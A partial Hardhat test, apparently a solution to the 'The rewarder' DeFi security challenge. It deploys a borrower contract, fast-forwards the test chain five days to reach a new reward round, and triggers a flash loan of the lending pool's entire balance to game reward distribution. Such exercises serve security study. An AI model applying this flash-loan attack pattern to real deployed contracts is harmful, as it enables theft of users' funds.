...
describe("[Challenge] The rewarder", function () {
  ...
  it("Execution", async function () {
    ...
    //get borrower contract and deploy
    let borrowerContract = await (
      await ethers.getContractFactory("Borrower", player)
    ).deploy(
    ...
    //wait 5 days to pass rewardPool's isNewRewardsRound()
    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days

    //initiate flashLoan
    await borrowerContract.connect(player).borrow(TOKENS_IN_LENDER_POOL);
  });
